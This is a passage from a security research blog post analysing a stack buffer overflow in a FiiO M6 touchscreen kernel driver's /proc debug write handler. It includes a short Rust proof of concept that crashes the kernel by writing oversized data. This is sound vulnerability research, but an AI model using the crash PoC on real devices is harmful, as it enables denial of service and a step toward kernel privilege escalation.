</pre></table></code></div></div><p>This shows an entry in the <code class="language-plaintext highlighter-rouge">/proc</code> filesystem being created with the name <code class="language-plaintext highlighter-rouge">ftxxxx-debug</code> and assigned handlers for both read and write operations. Since the crash happened during a write operations, we are mainly interested in the <code class="language-plaintext highlighter-rouge">ftxxxx_debug_write</code> function. The beginning of that function is as follows:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">ftxxxx_debug_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span> 

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">writebuf</span><span class="p">[</span><span class="n">FTS_PACKET_LENGTH</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">buflen</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">writelen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">writebuf</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">buflen</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">dev_err</span><span class="p">(</span><span class="o">&amp;</span><span class="n">client</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">,</span> <span class="s">"%s:copy from user error</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__func__</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">proc_operate_mode</span> <span class="o">=</span> <span class="n">writebuf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

	<span class="p">...</span>

<span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">buf</code> parameter is a pointer to our user space buffer which contains the data we are writing (the garbage <code class="language-plaintext highlighter-rouge">0x41</code>s). The <code class="language-plaintext highlighter-rouge">count</code> parameter is the length of that payload.</p><p>The function starts by initializing a <code class="language-plaintext highlighter-rouge">writebuf</code> which has a length of <code class="language-plaintext highlighter-rouge">FTS_PACKET_LENGTH</code>. Then it copies the total bytes of our write data into a new local variable, <code class="language-plaintext highlighter-rouge">buflen</code>. Finally it calls <code class="language-plaintext highlighter-rouge">copy_from_user</code>, passing in our kernel stack buffer, a pointer to our user space buffer, and the amount of data to be copied. True to its name, this function will “copy a block of data from user space” per its man page</p><p>Jumping to <code class="language-plaintext highlighter-rouge">ftxxxx_ex_fun.h</code>, we see the following on line 41:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">#define FTS_PACKET_LENGTH 128
</span></pre></table></code></div></div><p>Because <code class="language-plaintext highlighter-rouge">buf</code> and <code class="language-plaintext highlighter-rouge">buflen</code> are both user controlled values, we control an arbitrary amount of data to be written into a 128 byte kernel buffer, resulting in a buffer overflow!</p><p>Looking at the next part of the function, we see the following:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">ftxxxx_debug_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span> 

	<span class="n">proc_operate_mode</span> <span class="o">=</span> <span class="n">writebuf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

	<span class="k">switch</span> <span class="p">(</span><span class="n">proc_operate_mode</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">case</span> <span class="n">PROC_UPGRADE</span><span class="p">:</span>
		<span class="p">...</span>
	<span class="k">case</span> <span class="n">PROC_READ_REGISTER</span><span class="p">:</span>
		<span class="p">...</span>
	<span class="k">case</span> <span class="n">PROC_WRITE_REGISTER</span><span class="p">:</span>
		<span class="p">...</span>
	<span class="k">case</span> <span class="n">PROC_AUTOCLB</span><span class="p">:</span>
		<span class="p">...</span>
	<span class="k">case</span> <span class="n">PROC_READ_DATA</span><span class="p">:</span>
	<span class="k">case</span> <span class="n">PROC_WRITE_DATA</span><span class="p">:</span>
		<span class="p">...</span>
		
	<span class="nl">default:</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">count</span><span class="p">;</span>
</pre></table></code></div></div><p>I have removed the logic from each of the switch statement cases, as they are not relevant. What is relevant, however, is that the first byte of our overflowed buffer is used to determine the case for the switch. The constants are defined in the same file:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="cp">#define PROC_UPGRADE 0
#define PROC_READ_REGISTER 1
#define PROC_WRITE_REGISTER 2
#define PROC_AUTOCLB 4
#define PROC_UPGRADE_INFO 5
#define PROC_WRITE_DATA 6
#define PROC_READ_DATA 7
</span></pre></table></code></div></div><p>As such, any value that is not 0 through 7 (like say, <code class="language-plaintext highlighter-rouge">0x41</code> ) will evaluate to the default case, breaking from the <code class="language-plaintext highlighter-rouge">switch</code> and automatically returning. This causes our overflowed saved return pointer to be loaded into the PC and correspondingly crash.</p><h1 id="crash-poc">Crash PoC:</h1><div class="language-rust highlighter-rouge"><div class="code-header"> <span data-label-text="Rust"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">io</span><span class="p">::{</span><span class="n">Read</span><span class="p">,</span> <span class="n">Write</span><span class="p">,</span> <span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">};</span>
<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
 
<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// create our long payload</span>
    <span class="k">let</span> <span class="k">mut</span> <span class="n">buf</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0x41u8</span><span class="p">;</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">];</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"{}"</span><span class="p">,</span> <span class="n">buf</span><span class="nf">.len</span><span class="p">());</span>

	<span class="c1">// open /proc/ftxxxx-debug for writing</span>
    <span class="k">let</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/proc/ftxxxx-debug"</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">fd</span> <span class="o">=</span> <span class="nn">OpenOptions</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span><span class="nf">.write</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.open</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>

    <span class="nd">print!</span><span class="p">(</span><span class="s">"Writing {:?}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
    <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="k">mut</span> <span class="n">fd</span><span class="p">)</span> <span class="o">=</span> <span class="n">fd</span> <span class="p">{</span>
        <span class="k">let</span> <span class="n">fuzz_size</span> <span class="o">=</span> <span class="n">buf</span><span class="nf">.len</span><span class="p">();</span>
        <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="n">fd</span><span class="nf">.write</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="o">..</span><span class="n">fuzz_size</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h1 id="future-research">Future Research:</h1><p>While I haven’t weaponized this bug yet, it does appear to be highly exploitable at face value, depending on the kernel mitigations in place. For next steps, I would love to get an emulated version of the kernel running in order to debug an exploit. That is way outside of something I have done before, but I think it would be a great challenge. Depending on the mitigations in place, one or multiple additional bugs may be required to get arbitrary kernel execution, but based on the security posture of the device so far, I am willing to bet that they could be found with enough time and effort.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vuln-research/'>Vuln Research</a>, <a href='/categories/android/'>Android</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >kernel</a> <a href="/tags/research/" class="post-tag no-text-decoration" >research</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Rooting+the+FiiO+M6+-+Part+1+-+Using+the+%22World%27s+Worst+Fuzzer%22+To+Find+A+Kernel+Bug+-+Stigward%27s+Security+Journal&url=https%3A%2F%2Fstigward.github.io%2Fposts%2Ffiio-m6-kernel-bug%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Rooting+the+FiiO+M6+-+Part+1+-+Using+the+%22World%27s+Worst+Fuzzer%22+To+Find+A+Kernel+Bug+-+Stigward%27s+Security+Journal&u=https%3A%2F%2Fstigward.github.io%2Fposts%2Ffiio-m6-kernel-bug%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstigward.github.io%2Fposts%2Ffiio-m6-kernel-bug%2F&text=Rooting+the+FiiO+M6+-+Part+1+-+Using+the+%22World%27s+Worst+Fuzzer%22+To+Find+A+Kernel+Bug+-+Stigward%27s+Security+Journal" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/fiio-m6-exploit/">Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</a><li><a href="/posts/fiio-m6-kernel-bug/">Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</a><li><a href="/posts/swordmaster-pwn-chal/">UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/fiio-m6-exploit/"><div class="card-body"> <em class="small" data-ts="1679974380" data-df="ll" > Mar 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</h3><div class="text-muted small"><p> Overview: A little over a month ago, I wrote a blog post detailing how I found a kernel vulnerability in the FiiO M6 Hi-Fi MP3 player. I would recommend reading that post first, but to recap: T...</p></div></div></a></div><div class="card"> <a href="/posts/wavlink-command-injection/"><div class="card-body"> <em class="small" data-ts="1649215980" data-df="ll" > Apr 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Wavlink Command Injection - CVE-2022-23900</h3><div class="text-muted small"><p> Wavlink Command Injection (CVE-2022–23900) TL/DR: The Wavlink WL-WN531P3 router exposes an API endpoint susceptible to command injection. This API endpoint is reachable without an authenticatio...</p></div></div></a></div><div class="card"> <a href="/posts/swordmaster-pwn-chal/"><div class="card-body"> <em class="small" data-ts="1664163180" data-df="ll" > Sep 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</h3><div class="text-muted small"><p> Swordmaster Pwn Challenge Overview: This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadl...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/swordmaster-pwn-chal/" class="btn btn-outline-primary" prompt="Older"><p>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</p></a> <a href="/posts/fiio-m6-exploit/" class="btn btn-outline-primary" prompt="Newer"><p>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_stigward">Stigward</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QK87P1LVPH'); }); </script>
